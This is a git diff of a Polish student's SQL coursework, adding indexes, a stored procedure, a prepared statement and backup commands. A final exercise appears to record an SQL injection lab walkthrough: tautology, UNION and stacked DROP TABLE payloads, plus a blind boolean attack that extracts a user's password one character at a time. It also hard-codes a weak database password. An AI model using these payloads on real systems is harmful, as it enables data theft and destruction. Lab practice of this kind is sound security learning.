@@ -2,6 +2,9 @@
 
 CREATE DATABASE firma;
 
+CREATE USER 'szef'@'localhost' IDENTIFIED BY 'szef123';
+GRANT ALL PRIVILEGES ON firma.* TO 'szef'@'localhost';
+
 CREATE TABLE firma.Ludzie (
     PESEL VARCHAR(11) PRIMARY KEY NOT NULL, --  Pesel to dobry klucz ponieważ jest unikalny
     Imie VARCHAR(30) NOT NULL,
@@ -141,4 +144,113 @@ END$$
 DELIMITER ;
 
 -- 2)
+ALTER TABLE firma.Ludzie ADD INDEX (Plec, Imie);
+ALTER TABLE firma.Pracownicy ADD INDEX (pensja);
 
+SHOW INDEX FROM firma.Ludzie;
+SHOW INDEX FROM firma.Pracownicy;
+DROP 
+
+EXPLAIN select * from firma.Ludzie where Plec = 'M' and Imie = 'Anna';
+
+SELECT * FROM firma.Ludzie WHERE Plec = 'K' AND Imie LIKE 'A%';
+SELECT * FROM firma.Ludzie WHERE Plec = 'M';
+SELECT * FROM firma.Ludzie WHERE Imie LIKE 'K%';
+SELECT * FROM firma.Ludzie WHERE PESEL in (SELECT PESEL FROM firma.Pracownicy WHERE pensja < 2000);
+SELECT * FROM firma.Ludzie WHERE Plec = 'M' AND PESEL in (SELECT PESEL FROM firma.Pracownicy WHERE pensja > 10000);
+
+-- W tabeli Ludzie mamy indeksy na kolumnach PESEL, (Plec, Imie)
+-- w Practownicy mamy indeks na kolumnie PESEL, zawod_id, pensja
+
+-- Optymalizator zoptymalizuje zapytanie 1, 2 , 4, 5
+
+-- 3)
+
+DELIMITER $$
+DROP procedure IF EXISTS `firma`.`podwyzka`$$
+CREATE PROCEDURE `firma`.`podwyzka`(n VARCHAR(50))
+BEGIN
+    DECLARE zid INT;
+    SET zid = (SELECT zawod_id FROM firma.Zawody WHERE nazwa = n);
+    START TRANSACTION;
+    UPDATE firma.Pracownicy SET pensja = pensja * 1.05 WHERE zawod_id = zid;
+
+    IF EXISTS (SELECT * FROM firma.Pracownicy WHERE pensja > (SELECT pensja_max FROM firma.Zawody WHERE zawod_id = zid)) THEN
+        ROLLBACK;
+    ELSE
+        COMMIT;
+    END IF;
+END$$
+DELIMITER ;
+
+-- 4)
+
+PREPARE countWomen FROM 'SELECT COUNT(*)
+FROM firma.Ludzie l JOIN firma.Pracownicy p
+ON l.PESEL = p.PESEL
+WHERE l.Plec = "K" AND 
+p.zawod_id in (SELECT zawod_id FROM firma.Zawody WHERE nazwa = ?)';
+
+EXECUTE countWomen USING 'polityk';
+
+-- 5)
+
+-- > mkdir./dbbackup
+-- > mysqldump -u szef -p firma > ./dbbackup/firma.dump.sql
+DROP DATABASE firma;
+CREATE DATABASE firma;
+-- > mysql -u szef -p firma < ./dbbackup/firma.dump.sql
+
+-- Backup pełny - wszystkie dane
+-- Backup różnicowy - tylko zmienione dane od ostatniego backupu pełnego
+
+-- 6)
+
+-- intro
+SELECT department FROM Employees WHERE CONCAT(first_name, ' ', last_name) = 'Bob Franco';
+UPDATE Employees SET department = 'Sales' WHERE CONCAT(first_name, ' ', last_name) = 'Tobi Barnett';
+ALTER TABLE employees ADD COLUMN phone VARCHAR(20);
+GRANT ALL PRIVILEGES ON grant_rights TO unauthorized_user;
+SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1';
+SELECT * From user_data WHERE Login_Count = 1 and userid= 2 OR 1=1;
+-- SELECT"'; GRANT ALL PRIVILEGES ON access_log TO public; drop table access_log; SELECT * from employees where last_name='
+
+-- advanced
+
+-- Smith' OR 1=1 UNION select * from user_system_data where '1'='1
+-- SELECT * FROM user_data WHERE last_name = 'Smith';select * from user_system_data where '1'='1'
+
+-- W piątym doszedłem do tego że login jest vulnerable i zwraca: 
+-- 'User 123' or 1=1-- already exists please try to register with a different username.' na true
+-- 'User Tom' and 1=2-- created, please proceed to the login page.' na false
+
+-- Więc jest tam jakiś If Exists select * from users where username = 'Tom' or 1=1--...
+
+-- name: Jacek
+-- password: haslo
+
+-- Jacek' and password='haslo'-- true
+-- Jacek' and password='hasl'-- false
+
+-- Jacek' and LENGTH(password)=5-- true
+-- Jacek' and LENGTH(password)=4-- false
+
+-- Tom' and LENGTH(password) between 1 and 10-- true
+-- Tom' and LENGTH(password) between 8 and 10-- true
+-- Tom' and LENGTH(password) between 8 and 8-- true
+-- Długość hasła to 8
+
+-- Tom' and ASCII(SUBSTRING(password, 1, 1))<91-- true
+-- Tom' and ASCII(SUBSTRING(password, 1, 1))<81<-- true etc.
+-- Tom' and ASCII(SUBSTRING(password, 1, 1))<51 -- false
+
+-- Pierwsza litera to 3
+-- Druga litera to 2
+-- Trzecia litera to 3
+-- Czwarta litera to 2
+-- Piąta litera to 1
+-- Szósta litera to 3
+-- Siódma litera to 2
+-- Ósma litera to 1
+
+-- Tom' OR password='32321321'-- true
